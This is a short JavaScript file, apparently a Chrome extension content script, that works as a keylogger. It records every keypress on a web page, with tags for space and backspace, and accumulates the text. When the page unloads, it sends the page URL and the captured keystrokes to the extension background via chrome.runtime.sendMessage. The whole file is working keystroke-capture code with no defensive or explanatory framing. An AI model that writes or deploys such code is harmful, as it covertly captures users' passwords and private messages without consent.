// var data = {};
// var b = location.href;
// var a ;
var data = '';
document.addEventListener('keypress', function (event) {
	var a ;
	var b = location.href;
var ascii = event.keyCode;
console.log(ascii);
if((ascii >= 65 && ascii <= 90) || (ascii >= 97 && ascii <= 122))
{
    a = String.fromCharCode(event.which);
    console.log(a);
}

else if(ascii == 32)
{
	console.log("Space");
	a = "[Sp]";
	
}

else if(ascii == 8)
{
	console.log("BackSpace");
	a = "[Bksp]";
	
}

else
{
	a = String.fromCharCode(event.which);
	console.log(a);
}
if(b == null)
{
   data = "" + a;
}
else
{
	data = data + a;

}
console.log(data);

});
window.addEventListener('beforeunload', function()
{
	if(data != '')
	{
		data="URL is: "+location.href+"   Data is: "+data;
	    chrome.runtime.sendMessage(data);
	}
},false);


